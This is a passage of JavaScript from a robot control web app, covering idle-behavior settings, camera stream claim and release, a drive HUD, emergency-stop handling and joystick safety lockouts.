    const lastPlayed = behaviorPanel._lastIdleChoreo || '';
    _choreoList.forEach((name, idx) => {
      const pill = document.createElement('span');
      pill.className = 'beh-choreo-pill';
      // W7 fix 2026-05-16: highlight last-fired idle choreo
      if (name === lastPlayed) pill.classList.add('last-played');
      // W3 fix 2026-05-16: prefix with lock icons if choreo moves bot
      const locks = _locksFor(name);
      if (locks) {
        const lockSpan = document.createElement('span');
        lockSpan.className = 'beh-pill-locks';
        lockSpan.textContent = locks + ' ';
        lockSpan.title = 'This choreo will lock joysticks during play';
        pill.appendChild(lockSpan);
      }
      pill.appendChild(document.createTextNode(name + ' '));
      const btn = document.createElement('button');
      btn.className = 'beh-pill-remove';
      btn.textContent = '×';
      btn.addEventListener('click', () => behaviorPanel._removeChoreo(idx));
      pill.appendChild(btn);
      container.appendChild(pill);
    });
    // W10 fix 2026-05-16: surface count in label
    const lbl = container.previousElementSibling;
    if (lbl && lbl.classList?.contains('ctrl-label')) {
      lbl.textContent = 'CHOREO LIST (' + _choreoList.length + ')';
    }
  }

  function _removeChoreo(idx) {
    _choreoList.splice(idx, 1);
    _renderChoreoPills();
  }

  function save() {
    // B9 fix 2026-05-16: empty select → empty string, not bogus 'startup.chor'
    const payload = {
      startup_enabled:     el('beh-startup-enabled')?.checked ?? false,
      startup_delay:       parseInt(el('beh-startup-delay')?.value || '5', 10),
      startup_choreo:      _getSelVal('beh-startup-choreo'),
      alive_enabled:       el('beh-alive-enabled')?.checked ?? false,
      idle_timeout_min:    parseInt(el('beh-idle-timeout')?.value || '10', 10),
      idle_mode:           _getSelVal('beh-idle-mode') || 'sounds',
      idle_audio_category: _getSelVal('beh-audio-category'),
      idle_choreo_list:    _choreoList,
      dome_auto_on_alive:  el('beh-dome-auto')?.checked ?? true,
    };
    // W4/E10 fix 2026-05-16: withSaveFeedback parité reste de l'app
    const btn = el('beh-save-btn');
    const run = async () => {
      const res = await apiDetail('/behavior/config', 'POST', payload);
      if (res.ok) {
        toast('Behavior config saved', 'ok');
        // Refresh idle_mode_ready warning + countdown after save
        load();
        return true;
      } else {
        // B19 fix 2026-05-16: surface backend error message verbatim
        toast(res.error || 'Save failed', 'error');
        return false;
      }
    };
    if (btn && typeof withSaveFeedback === 'function') withSaveFeedback(btn, run);
    else run();
  }

  // W1 fix 2026-05-16: TEST NOW — fire current idle_mode immediately
  function testTrigger() {
    const btn = el('beh-test-trigger-btn');
    const run = async () => {
      const res = await apiDetail('/behavior/test_trigger', 'POST');
      if (res.ok) {
        toast(`▶ Idle ${res.data?.mode_fired || ''} fired`, 'ok');
        return true;
      } else {
        toast(res.error || 'Test trigger failed', 'error');
        return false;
      }
    };
    if (btn && typeof withSaveFeedback === 'function') withSaveFeedback(btn, run);
    else run();
  }

  // W17 fix 2026-05-16: preset chip-buttons fill the form (no auto-save).
  // Operator reviews and hits SAVE if happy.
  function preset(name) {
    const PRESETS = {
      conservative: { timeout: 30, mode: 'sounds',        dome: false },
      playful:      { timeout: 8,  mode: 'sounds_lights', dome: true  },
      demo:         { timeout: 4,  mode: 'choreo',        dome: false },
    };
    const p = PRESETS[name];
    if (!p) return;
    _setVal('beh-idle-timeout', p.timeout);
    _setSelVal('beh-idle-mode', p.mode);
    _setChk('beh-dome-auto', p.dome);
    onModeChange();
    toast(`Preset "${name}" applied — review and SAVE`, 'info');
  }

  // W11 fix 2026-05-16: live computed "Next trigger ~ 11:47 PM" hint as
  // operator types in the timeout field. Uses last_activity ago from
  // status (cached on load) to compute realistic next-fire time.
  function _updateTimeoutPreview() {
    const min = parseInt(el('beh-idle-timeout')?.value || '10', 10);
    const span = el('beh-timeout-preview');
    if (!span) return;
    if (!isFinite(min) || min < 1) { span.textContent = ''; return; }
    const next = new Date(Date.now() + min * 60 * 1000);
    const hh = next.getHours().toString().padStart(2, '0');
    const mm = next.getMinutes().toString().padStart(2, '0');
    span.textContent = `→ ~${hh}:${mm}`;
  }

  // W2 fix 2026-05-16: TEST STARTUP — preview startup choreo without reboot
  function testStartup() {
    const btn = el('beh-test-startup-btn');
    const run = async () => {
      const res = await apiDetail('/behavior/test_startup', 'POST');
      if (res.ok) {
        toast(`▶ Startup ${res.data?.choreo || ''} fired`, 'ok');
        return true;
      } else {
        toast(res.error || 'Test startup failed', 'error');
        return false;
      }
    };
    if (btn && typeof withSaveFeedback === 'function') withSaveFeedback(btn, run);
    else run();
  }

  // W5 helper — populate select with counts and disable empty categories
  function _populateSelWithCounts(id, entries, selected) {
    const sel = el(id);
    if (!sel) return;
    sel.innerHTML = '';
    entries.forEach(({name, count}) => {
      const opt = document.createElement('option');
      opt.value = name;
      opt.textContent = `${name} (${count})`;
      if (count === 0) opt.disabled = true;
      if (name === selected) opt.selected = true;
      sel.appendChild(opt);
    });
  }

  // ------------------------------------------------------------------
  // Private helpers
  // ------------------------------------------------------------------
  function _setChk(id, val)        { const e = el(id); if (e) e.checked = !!val; }
  function _setVal(id, val)        { const e = el(id); if (e) e.value  = val; }
  function _getSelVal(id)          { return el(id)?.value || ''; }
  function _setSelVal(id, val)     { const e = el(id); if (e) e.value = val; }
  function _show(id, visible)      { const e = el(id); if (e) e.style.display = visible ? '' : 'none'; }
  function _setStatus(id, msg, cls) {
    const e = el(id);
    if (!e) return;
    e.textContent = msg;
    e.className = `settings-status settings-status-${cls}`;
    setTimeout(() => { if (e) e.textContent = ''; }, 3000);
  }
  function _populateSel(id, items, selected) {
    const sel = el(id);
    if (!sel) return;
    sel.innerHTML = '';
    items.forEach(item => {
      const opt = document.createElement('option');
      opt.value = item;
      opt.textContent = item;
      if (item === selected) opt.selected = true;
      sel.appendChild(opt);
    });
  }

  return { toggleAlive, load, onModeChange, addChoreo, save, testTrigger, testStartup, preset, _updateTimeoutPreview, _removeChoreo, _applyAliveBtn };
})();

// ================================================================
// Camera — last-connect-wins proxy via Flask /camera/*
// ================================================================

let _camToken        = null;
let _camEnabled      = true;
let _camPollTimer    = null;
let _camRefreshTimer = null;  // periodic stream refresh to prevent Chrome memory leak
let _camResumeRetry  = null;  // retry interval after screen wake / tab return
let _camErrored      = false; // true when img.onerror fires (mjpg_streamer down)

// LOW polish 2026-05-15: single helper to clear the camera poll timer
// + null the ref. The old code had 8+ inline `clearInterval(_camPollTimer)`
// calls; some left the ref non-null which could mask a "still running"
// state in conditional logic later. One source of truth = no leak risk.
function _clearCamPollTimer() {
  if (_camPollTimer) { clearInterval(_camPollTimer); _camPollTimer = null; }
}

function _camBase() {
  return (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE)
    ? window.R2D2_API_BASE : '';
}

// F-10: prevent overlapping POST /camera/take calls. The function is
// fired from multiple paths (button click, visibility resume, poll
// recovery, img.onerror cascade) and the network round-trip is ~50-200ms.
// Without this guard, two near-simultaneous take requests both succeed,
// the SECOND token overrides the first, the first img.src=…&t=<old> 404s
// immediately → onerror → another _takeCameraStream → cascade. Single
// in-flight slot eliminates the cascade.
let _camTakeInFlight = false;
async function _takeCameraStream() {
  if (!_camEnabled) return;
  if (_camTakeInFlight) return;
  _camTakeInFlight = true;
  try {
    const r = await fetch(_camBase() + '/camera/take', { method: 'POST' })
      .then(r => r.json()).catch(() => null);
    if (!r) {
      // F-16: surface camera service failure to the user. Without this,
      // the green grid cam-bg stayed on forever with no indication that
      // /camera/take returned null (Flask camera blueprint down, service
      // not running, etc.). Re-use the cam-taken overlay shell but show
      // a different message so the user can distinguish "another client
      // stole it" from "camera service offline".
      // Bug M1-W fix 2026-05-15: distinct visual for OFFLINE vs TAKEN.
      // Operator clicking 'TAKE STREAM' on offline state → request
      // fails again → looks like button is broken. Now: amber border
      // + 'RETRY' label so the two states read differently.
      const taken = el('cam-taken');
      const txt   = taken ? taken.querySelector('.cam-taken-text') : null;
      const btn2  = taken ? taken.querySelector('.cam-taken-btn') : null;
      if (txt)   txt.textContent = 'CAMERA OFFLINE — retry?';
      if (btn2)  btn2.textContent = 'RETRY CAMERA';
      if (taken) {
        taken.classList.add('cam-offline-state');
        taken.style.display = 'flex';
      }
      return;
    }
    _camToken   = r.token;
    _camErrored = false;

    const img   = el('cam-stream');
    const bg    = el('cam-bg');
    const taken = el('cam-taken');
    if (!img) return;

    // Audit finding Camera M-3 + M-4 2026-05-15:
    //  - Set onerror BEFORE src so the latch catches errors during
    //    the very first byte (Chrome can fire onerror before our
    //    next line if the connection refuses immediately).
    //  - Explicit img.src = '' before reassignment so Android
    //    WebView (whose abort-on-reassignment behavior is
    //    inconsistent) is forced to drop the previous stream
    //    before starting the new one.
    img.onerror = () => { _camErrored = true; };
    if (img.src) img.src = '';

    if (taken) {
      const txt = taken.querySelector('.cam-taken-text');
      const btn2 = taken.querySelector('.cam-taken-btn');
      if (txt) txt.textContent = 'STREAM TAKEN';
      if (btn2) btn2.textContent = 'TAKE STREAM';
      taken.classList.remove('cam-offline-state');   // clear M1-W offline visual
      taken.style.display = 'none';
    }

    // Audit finding Camera L-3 2026-05-15: show a CONNECTING
    // placeholder until the first frame arrives. img.onload fires
    // on the first multipart payload chunk.
    if (bg) bg.dataset.state = 'connecting';
    img.onload = () => { if (bg) bg.dataset.state = 'live'; };

    img.src = _camBase() + `/camera/stream?t=${_camToken}&_=${Date.now()}`;
    img.style.display = 'block';
    if (bg) bg.style.display = 'none';

    _startCamPoll();
    _startCamRefresh();
  } finally {
    _camTakeInFlight = false;
  }
}

function _startCamPoll() {
  _clearCamPollTimer();
  _camPollTimer = setInterval(async () => {
    if (!_camToken || !_camEnabled) return;
    const r = await fetch(_camBase() + '/camera/status')
      .then(r => r.json()).catch(() => null);
    if (!r) return;

    if (r.active_token !== _camToken) {
      if (r.active_token < _camToken) {
        // Flask restarted (token reset to 0) — auto-reclaim silently
        _camToken = null;
        _clearCamPollTimer();
        setTimeout(() => _takeCameraStream(), 500);
      } else {
        // Another client claimed the slot — show overlay
        _camToken = null;
        const img   = el('cam-stream');
        const bg    = el('cam-bg');
        const taken = el('cam-taken');
        if (img)   { img.src = ''; img.style.display = 'none'; }
        if (bg)    bg.style.display = 'block';
        if (taken) taken.style.display = 'flex';
        _clearCamPollTimer();
      }
    } else if (_camErrored) {
      // Same Flask token but stream errored — mjpg_streamer restarted (e.g. resolution change)
      // Try to reclaim; if mjpg_streamer is back up Flask will serve the stream again
      _camErrored = false;
      _camToken   = null;
      _clearCamPollTimer();
      setTimeout(() => _takeCameraStream(), 1000);
    }
  }, 3000);
}

// Audit reclass R2 2026-05-15: pause the camera stream when the
// operator leaves the Drive tab. Saves bandwidth + tablet battery
// for the entire time they're in Settings/Audio/Sequences/etc.
// Resumed automatically when they switch back. Called from switchTab.
function _pauseCameraStream() {
  const img = el('cam-stream');
  if (img && img.src) {
    img.src = '';   // forces the browser to drop the MJPEG socket
  }
  _clearCamPollTimer();
  // Tell server we're releasing so the next viewer can claim.
  if (_camToken) {
    fetch(_camBase() + '/camera/release', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: _camToken }),
      keepalive: true,
    }).catch(() => {});
    _camToken = null;
  }
}

function _resumeCameraStream() {
  if (_camEnabled && !_camToken) _takeCameraStream();
}

function _toggleCamera() {
  _camEnabled = !_camEnabled;
  const btn   = el('cam-toggle-btn');
  const img   = el('cam-stream');
  const bg    = el('cam-bg');
  const taken = el('cam-taken');
  if (btn) {
    btn.classList.toggle('cam-on',  _camEnabled);
    btn.classList.toggle('cam-off', !_camEnabled);
  }
  if (_camEnabled) {
    _takeCameraStream();
  } else {
    _clearCamPollTimer();
    clearInterval(_camRefreshTimer);
    clearInterval(_camResumeRetry);
    // B1/E8 fix 2026-05-16: send the token in body — backend requires
    // {token: my_token} OR admin header. Toggle-off was sending neither
    // → 401 → server-side _active_token never reset → next tablet saw
    // 'STREAM TAKEN' overlay forever even though no one was viewing.
    const tokenToRelease = _camToken;
    _camToken = null;
    if (img)   { img.src = ''; img.style.display = 'none'; }
    if (taken) taken.style.display = 'none';
    if (bg)    bg.style.display = 'block';
    if (tokenToRelease) {
      fetch(_camBase() + '/camera/release', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: tokenToRelease }),
        keepalive: true,
      }).catch(() => {});
    }
  }
}

function _startCamRefresh() {
  clearInterval(_camRefreshTimer);
  // Restart the MJPEG connection every 5 minutes to prevent Chrome renderer memory accumulation
  _camRefreshTimer = setInterval(() => {
    if (_camEnabled && _camToken && !document.hidden) _takeCameraStream();
  }, 5 * 60 * 1000);
}

function _initCameraStream() {
  _takeCameraStream();
}

// Registered once — stops MJPEG stream when Chrome hides the tab/window
// (prevents STATUS_BREAKPOINT renderer crash from memory accumulation).
// On return, retries every 5s until stream is confirmed running.
let _camVisibilityListenerAdded = false;
function _initCamVisibilityHandler() {
  if (_camVisibilityListenerAdded) return;
  _camVisibilityListenerAdded = true;
  document.addEventListener('visibilitychange', () => {
    if (!_camEnabled) return;
    if (document.hidden) {
      _clearCamPollTimer();
      clearInterval(_camRefreshTimer);
      clearInterval(_camResumeRetry);
      const img = el('cam-stream');
      if (img) img.src = '';  // release MJPEG connection → free Chrome renderer memory
      _camToken = null;
    } else {
      // Retry every 5s until _takeCameraStream succeeds (network may not be ready immediately after wake)
      clearInterval(_camResumeRetry);
      let attempts = 0;
      const tryResume = () => {
        if (_camToken) { clearInterval(_camResumeRetry); return; }
        _takeCameraStream();
        if (++attempts >= 12) clearInterval(_camResumeRetry); // give up after 1 minute
      };
      tryResume();  // immediate attempt
      _camResumeRetry = setInterval(tryResume, 5000);
    }
  });
}

// ================================================================
// Drive HUD — speed arc + direction arrow
// ================================================================

// Arc length for "M6 40 A32 32 0 0 1 68 40" semicircle ≈ π × 32 ≈ 100.5
const _CAM_ARC_LEN = 101;

// F-12: requestAnimationFrame batching for the drive HUD. _updateDriveHUD
// was called at joystick onMove frequency (60 Hz) and on every WASD
// keyboard event. Each call mutated strokeDashoffset + stroke + opacity +
// transform, each of which can trigger a style recalc on low-end Android
// tablets — visible jank during sustained drive. Now: callers stash the
// latest (throttle, steering) into _hudPending and a single rAF schedules
// the actual DOM writes, capped at 60 Hz no matter how fast we're called.
let _hudPending = null;
let _hudRafId   = 0;
let _hudArcColorThreshold = 0;  // cache last arc color band to skip redundant writes
let _hudLastSpeedPct = -1;       // cache last text % to skip layout invalidation on Android

function _updateDriveHUD(throttle, steering) {
  _hudPending = { throttle, steering };
  if (_hudRafId) return;
  _hudRafId = requestAnimationFrame(_flushDriveHUD);
}

function _flushDriveHUD() {
  _hudRafId = 0;
  const data = _hudPending;
  _hudPending = null;
  if (!data) return;
  const { throttle, steering } = data;

  // Speed arc
  const speed = Math.min(1, Math.abs(throttle));
  const arc   = el('cam-speed-arc');
  const val   = el('cam-speed-val');
  if (arc) arc.style.strokeDashoffset = _CAM_ARC_LEN * (1 - speed);
  // Audit finding Drive UX H-4 2026-05-15: skip-if-unchanged on
  // textContent. At 60Hz joystick refresh, every assignment triggers
  // a layout invalidation on low-end Android tablets even when the
  // rounded percent is identical to the previous frame.
  const speedPct = Math.round(speed * 100);
  if (val && _hudLastSpeedPct !== speedPct) {
    val.textContent = speedPct + '%';
    _hudLastSpeedPct = speedPct;
  }

  // Color arc green→orange→red with speed. Skip the write when we're in
  // the same band — every assignment triggers a style recalc even when
  // the value is identical. F-11 theme awareness: use CSS vars when
  // available, fall back to hard-coded hex for very old themes.
  if (arc) {
    const band = speed < 0.5 ? 0 : speed < 0.8 ? 1 : 2;
    if (band !== _hudArcColorThreshold) {
      _hudArcColorThreshold = band;
      arc.style.stroke = ['var(--blue, #00aaff)', 'var(--amber, #ff8800)', 'var(--red, #ff2244)'][band];
    }
  }

  // Direction arrow
  const wrap = el('cam-dir-wrap');
  const poly = el('cam-dir-poly');
  if (!wrap) return;
  const mag = Math.sqrt(throttle * throttle + steering * steering * 0.3);
  if (mag > 0.05) {
    wrap.style.opacity = Math.min(1, mag * 2).toFixed(2);
    if (poly) {
      // atan2: 0=up, positive=clockwise
      const angleDeg = Math.atan2(steering, throttle) * (180 / Math.PI);
      wrap.style.transform = `translate(-50%,-50%) rotate(${angleDeg}deg)`;
    }
  } else {
    wrap.style.opacity = '0';
    // F-19: reset the rotation when hiding so we don't flash at the old
    // angle for one frame when motion resumes.
    wrap.style.transform = 'translate(-50%,-50%) rotate(0deg)';
  }
}

let _estopTripped = false;

// Per-axis choreo lockout — split so a panel/sound-only choreo
// leaves both joysticks free, while a choreo that DRIVES (propulsion
// track) or ROTATES THE DOME (dome track) locks only that axis. Set
// from data.choreo_uses_propulsion / data.choreo_uses_dome each
// status tick. Rising edge force-releases the matching joystick.
let _choreoPropLocked = false;
let _choreoDomeLocked = false;
// Legacy alias kept so older call sites compile — true if EITHER
// axis is locked, which approximates the previous "is anything in
// the choreo grabbing motion?" question.
let _choreoLocked = false;

function _setChoreoLockUI(propLocked, domeLocked, choreoName) {
  const wasProp = _choreoPropLocked;
  const wasDome = _choreoDomeLocked;
  _choreoPropLocked = propLocked;
  _choreoDomeLocked = domeLocked;
  _choreoLocked = propLocked || domeLocked;
  document.body.classList.toggle('choreo-locked',      _choreoLocked);
  document.body.classList.toggle('choreo-prop-locked', propLocked);
  document.body.classList.toggle('choreo-dome-locked', domeLocked);
  // Bug B1 fix 2026-05-15: drive the badge text via CSS var so the
  // operator-set LABEL (not the filename) shows on the locked joystick.
  // 2026-05-15: look up the friendly label from the scriptEngine cache,
  // fall back to the filename if no label / no cache yet.
  let displayName = choreoName || '';
  try {
    if (choreoName && typeof scriptEngine !== 'undefined' && scriptEngine._scripts) {
      const meta = scriptEngine._scripts.find(s => s.name === choreoName);
      if (meta && meta.label) displayName = meta.label;
    }
  } catch {}
  const upperName = displayName.toUpperCase();
  // Bug M4 fix 2026-05-15: use JSON.stringify so backslashes, newlines,
  // control chars, etc. in operator labels can't break the CSS string
  // (or worse, escape into a selector). Previous escape only handled ".
  const cssVal = upperName
    ? JSON.stringify(`🎬 ${upperName}`)
    : '"🎬 CHOREO"';
  document.documentElement.style.setProperty('--choreo-name', cssVal);
  const lbl = el('choreo-lock-label');
  if (lbl) lbl.textContent = displayName;
  // Force-release only the joystick whose axis newly locked. A
  // dome-track choreo doesn't touch propulsion, so the user can keep
  // driving without their left joystick snapping back unexpectedly.
  if (propLocked && !wasProp) {
    if (typeof jsLeft !== 'undefined' && jsLeft.forceRelease) jsLeft.forceRelease();
    if (typeof _keys !== 'undefined') {
      // Only clear propulsion keys (WASD); keep arrow keys for dome
      // since dome is locked separately.
      ['w','a','s','d','W','A','S','D'].forEach(k => delete _keys[k]);
      if (typeof _updateKbdUI === 'function') _updateKbdUI();
    }
    // Audit finding Drive UX H-2 2026-05-15: snap the HUD to 0 so
    // the speed arc + direction arrow don't freeze at the last
    // pre-lock value. Mirrors the E-STOP path which clears HUD via
    // _handleKeys when a held key triggers driveStop.
    if (typeof _updateDriveHUD === 'function') _updateDriveHUD(0, 0);
    if (typeof _propKeyWasActive !== 'undefined') _propKeyWasActive = false;
  }
  if (domeLocked && !wasDome) {
    if (typeof jsRight !== 'undefined' && jsRight.forceRelease) jsRight.forceRelease();
    if (typeof _keys !== 'undefined') {
      ['ArrowLeft','ArrowRight'].forEach(k => delete _keys[k]);
      if (typeof _updateKbdUI === 'function') _updateKbdUI();
    }
    if (typeof _domeKeyWasActive !== 'undefined') _domeKeyWasActive = false;
  }
}

function _setEstopUI(tripped) {
  const wasTripped = _estopTripped;
  _estopTripped = tripped;
  const btn     = el('estop-toggle-btn');
  const txt     = el('estop-toggle-text');
  const overlay = el('estop-overlay');
  if (overlay) overlay.classList.toggle('active', tripped);
  // Force-release both joysticks on the True transition. The overlay is
  // pointer-events:none (cosmetic only), so without this the user's finger
  // stays "held" on the knob — the server-side gate (B-1) refuses the
  // POSTs but the visual knob stays deflected and the keep-alive interval
  // keeps trying. Snapping the knob back to centre and clearing _pointerId
  // gives an immediate visual confirmation that drive is cut.
  if (tripped && !wasTripped) {
    if (typeof jsLeft !== 'undefined' && jsLeft.forceRelease) jsLeft.forceRelease();
    if (typeof jsRight !== 'undefined' && jsRight.forceRelease) jsRight.forceRelease();
    // Clear keyboard state too — a held W key would otherwise resume drive
    // as soon as estop_reset fires. Mirrors the window.blur cleanup below.
    if (typeof _keys !== 'undefined') {
      for (const k of Object.keys(_keys)) delete _keys[k];
      if (typeof _updateKbdUI === 'function') _updateKbdUI();
    }
    // VESC E1 fix 2026-05-16: auto-disable Test Mode on E-STOP fire.
    // Test Mode has its own keyboard pipeline (vescTest.onKey captures
    // BEFORE the global drive gate); leaving it active when E-STOP
    // trips meant the operator could keep slamming WASD against the
    // safety chain (server rejects but UI looks live). Force the
    // toggle off so the danger surface is hidden.
    if (typeof vescTest !== 'undefined' && vescTest._active) {
      try { vescTest.toggle(); } catch(e) {}
    }
  }
  if (!btn) return;
  if (tripped) {
    btn.classList.replace('estop-armed', 'estop-tripped');
    if (txt) txt.textContent = 'RESET E-STOP';
    btn.querySelector('.estop-icon').innerHTML = '&#9654;';
  } else {
    btn.classList.replace('estop-tripped', 'estop-armed');
    if (txt) txt.textContent = 'EMERGENCY STOP';
    btn.querySelector('.estop-icon').innerHTML = '&#9632;';
  }
}

// Window blur / visibilitychange — release joysticks and clear key state
// when this browser window loses focus or becomes hidden. Without this,
// a user holding the joystick (or W key) who Alt-Tabs to another window
// never gets pointerup / keyup (those events go to the new focused
// window). The joystick's keep-alive interval would keep re-sending the
// last deflection, and the AppWatchdog wouldn't trip if the heartbeat
// already shut off cleanly via the existing visibilitychange path.
function _releaseAllControlInputs() {
  if (typeof jsLeft !== 'undefined' && jsLeft.forceRelease) jsLeft.forceRelease();
  if (typeof jsRight !== 'undefined' && jsRight.forceRelease) jsRight.forceRelease();
  if (typeof _keys !== 'undefined') {
    for (const k of Object.keys(_keys)) delete _keys[k];
    if (typeof _updateKbdUI === 'function') _updateKbdUI();
    if (typeof _handleKeys === 'function') _handleKeys();
  }
}
window.addEventListener('blur', _releaseAllControlInputs);
// Audit finding Drive H-2 (Agent 1 + Agent 6) 2026-05-15: Android
// Chrome fires `visibilitychange` when a tab goes to background
// WITHOUT firing `blur`. Without this hook, the joystick keep-alive
// keeps re-posting the held deflection until AppWatchdog (600ms) cuts
// it — operator backgrounds the browser while holding the stick =
// ~600ms of unintended drive. Now both events release joysticks +
// clear keys.
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    _releaseAllControlInputs();
    // Audit reclass C2 2026-05-15: pause _chorMon rAF loop too —
    // Android WebView doesn't auto-throttle rAF for hidden tabs the
    // way desktop Chrome does. Operator minimizes browser, monitor
    // keeps drawing dots = battery + CPU drain ("tablette chauffe").
    if (typeof _chorMon !== 'undefined' && _chorMon.pause) _chorMon.pause();
  } else {
    // Resume only if back on the Choreo tab — else the monitor
    // would restart for nothing.
    const onChoreo = document.querySelector('.tab.active')?.dataset.tab === 'choreo';
    if (onChoreo && typeof _chorMon !== 'undefined' && _chorMon.resume) {
      _chorMon.resume();
    }
  }
});

// F-9: serialize E-STOP / RESET button so rapid clicks (or a click during
// the network round-trip of the previous action) cannot fire two stop or
// two reset sequences. _estopBusy stays True from the moment the button
// is pressed until either the request resolves or a short cooldown
// elapses (300ms) — whichever comes later.
let _estopBusy = false;

function toggleEstop() {
  if (_estopBusy) return;
  if (_estopTripped) { estopReset(); } else { emergencyStop(); }
}

function emergencyStop() {
  // STRICT FREEZE — never command servos here. Drive/dome motor + audio are
  // cut, then /system/estop tells the backend to freeze every servo at its
  // CURRENT position (PWM held, no ramping back to close). Calling
  // /servo/{dome,body}/close_all from here would race the freeze and let
  // panels return to the closed position, which is exactly the bug we're
  // avoiding — Reset E-STOP is what stows the robot at a safe slew rate.
  // F-9: flip _estopTripped + _estopBusy IMMEDIATELY so a click landing
  // during the await on the four POSTs cannot re-fire emergencyStop().
  _estopBusy = true;
  _setEstopUI(true);
  driveStop();
  domeStop();
  api('/audio/stop', 'POST');
  api('/system/estop', 'POST');
  toast('EMERGENCY STOP — frozen in place', 'error');
  audioBoard.setPlaying(false);
  setTimeout(() => { _estopBusy = false; }, 300);
}

function estopReset() {
  // F-9: serialization. Don't flip _estopTripped here — wait for server
  // confirmation. _estopBusy prevents double-fire during the round-trip.
  //
  // Bug H3 fix 2026-05-15: removed the 500ms _stowWatch interval that
  // raced the 2s StatusPoller. The poller is now the SINGLE source of
  // truth for STOWING / EMERGENCY STOP text transitions (line ~6918).
  // It also fires the 'Ready' toast on the stow_in_progress:true→false
  // transition. Removes 30 extra /status hits per stow + eliminates
  // the race where two writers fight over the same text element.
  //
  // User-reported 2026-05-16: button got stuck on STOWING after reset.
  // Root cause unconfirmed but symptoms point to a missed poll during
  // the stow window (visibilitychange throttling? worker hiccup?).
  // Safety belt: 30s fallback timer force-clears STOWING if poller
  // didn't catch the false transition. Stow runs ~3-5s normally so
  // 30s is a comfortable upper bound that won't fire under normal ops.
  _estopBusy = true;
  const txt = el('estop-toggle-text');
  if (txt) txt.textContent = 'STOWING…';   // optimistic — poller will sync
  api('/system/estop_reset', 'POST').then(r => {
    if (r && (r.status === 'reset' || r.status === 'estop_already_clear')) {
      toast('Stowing servos…', 'info');
      _setEstopUI(false);
      if (txt) txt.textContent = 'STOWING…';   // poller flips back when done
      // 2026-05-16 user-reported "ça fait un bail": instead of waiting
      // 2s for the StatusPoller to detect stow_in_progress flip, poll
      // /status directly every 500ms for up to 10s. Backend safe_home
      // takes ~1-2s measured, so this clears the text within ~500ms
      // of physical motion ending — perceived as "instant".
      let elapsed = 0;
      const fastPoll = setInterval(async () => {
        elapsed += 500;
        if (elapsed > 10000) {
          clearInterval(fastPoll);
          if (txt && txt.textContent === 'STOWING…') {
            console.warn('estopReset: 10s fast-poll timeout, force-clearing');
            txt.textContent = 'EMERGENCY STOP';
          }
          return;
        }
        const d = await api('/status').catch(() => null);
        if (!d) return;
        if (!d.stow_in_progress && !d.estop_active) {
          clearInterval(fastPoll);
          if (txt && txt.textContent === 'STOWING…') {
            txt.textContent = 'EMERGENCY STOP';
          }
        }
      }, 500);
    } else {
      if (txt) txt.textContent = 'RESET E-STOP';
      toast('Reset failed', 'error');
    }
  }).catch(() => {
    if (txt) txt.textContent = 'RESET E-STOP';
    toast('Reset failed', 'error');
  })
    .finally(() => { _estopBusy = false; });
}

// Left joystick — Propulsion (arcade drive)
let _vescDriveSafe = true;

function _applyVescSafetyLock(safe, lOk, rOk) {
  const wasSafe = _vescDriveSafe;
  _vescDriveSafe = safe;
  // F-15: also apply a visual cue on the propulsion joystick ring so the
  // user sees the drive is disabled, not just the banner. Toggling the
  // vesc-blocked class is cheap and lets CSS handle the styling (dim +
  // strike-through outline). Force-release the joystick on the
  // True→False transition so a holding finger drops immediately.
  const ring = el('js-left-ring');
  if (ring) ring.classList.toggle('vesc-blocked', !safe);
  if (wasSafe && !safe) {
    if (typeof jsLeft !== 'undefined' && jsLeft.forceRelease) jsLeft.forceRelease();
  }
  const banner = el('vesc-safety-banner');
  const msg    = el('vesc-safety-msg');
  if (!banner) return;
  if (safe) {
    banner.style.display = 'none';
  } else {
    const who = (!lOk && !rOk) ? 'L+R OFFLINE' : (!lOk ? 'L OFFLINE' : 'R OFFLINE');
    if (msg) msg.textContent = `DRIVE BLOCKED — VESC ${who}`;
    banner.style.display = '';
  }
}

let _leftActive = false;
const jsLeft = new VirtualJoystick(
  'js-left-ring', 'js-left-knob',
  (x, y) => {
    // Defense-in-depth E-STOP gate — pointerdown already refuses to start
    // when _estopTripped, but a poll-based E-STOP that fires AFTER the user
    // started dragging would otherwise let onMove continue spamming.
    if (_estopTripped) return;
    if (_choreoPropLocked) return;         // Choreo owns propulsion track
    if (lockMgr.isDriveLocked()) return;   // Child Lock : joystick gauche bloqué
    if (!_vescDriveSafe) return;           // VESC offline/fault
    _leftActive = true;
    const throttle = -y * _speedLimit;
    const steering =  x * _speedLimit * 0.55;
    _postMotion('/motion/arcade', { throttle, steering });
    _updateDriveHUD(throttle, steering);
    const t = el('js-left-t'); if (t) t.textContent = throttle.toFixed(2);
    const s = el('js-left-s'); if (s) s.textContent = steering.toFixed(2);
  },
  () => {
    _leftActive = false;
    driveStop();
    _updateDriveHUD(0, 0);
    const t = el('js-left-t'); if (t) t.textContent = '0.00';
    const s = el('js-left-s'); if (s) s.textContent = '0.00';
  }
);

// Right joystick — Dome
let _domeActive = false;
const jsRight = new VirtualJoystick(
  'js-right-ring', 'js-right-knob',
  (x, y) => {
    if (_estopTripped) return;
    // Per-axis gate: only the X axis (dome rotation) is owned by
    // 'dome' tracks. Y axis is reserved for the camera in v2 — when
    // that ships, it will read x freely while dome is choreo-locked.
    // For now we simply clamp x to 0 when dome-locked so the operator
    // can already prep for the v2 split.
    if (_choreoDomeLocked) x = 0;
    const DEADZONE = 0.06;
    const vx = el('js-right-x'); if (vx) vx.textContent = x.toFixed(2);
    const vy = el('js-right-y'); if (vy) vy.textContent = y.toFixed(2);
    if (Math.abs(x) > DEADZONE) {
      _postMotion('/motion/dome/turn', { speed: x * 0.85 });
      _domeActive = true;
    } else if (_domeActive) {
      domeStop();
      _domeActive = false;
    }
  },
  () => {
    domeStop();
    _domeActive = false;
    const vx = el('js-right-x'); if (vx) vx.textContent = '0.00';
    const vy = el('js-right-y'); if (vy) vy.textContent = '0.00';
  }
);

// ================================================================
// Keyboard Control (WASD / Arrows)
// ================================================================

const _keys = {};
// WASD → propulsion indicators | Arrows → dome indicators (separate)
const KBD_IDS = {
  'KeyW': 'kbd-w', 'KeyS': 'kbd-s', 'KeyA': 'kbd-a', 'KeyD': 'kbd-d',
  'ArrowUp': 'kbd-up', 'ArrowDown': 'kbd-down', 'ArrowLeft': 'kbd-left', 'ArrowRight': 'kbd-right',
};

document.addEventListener('keydown', e => {
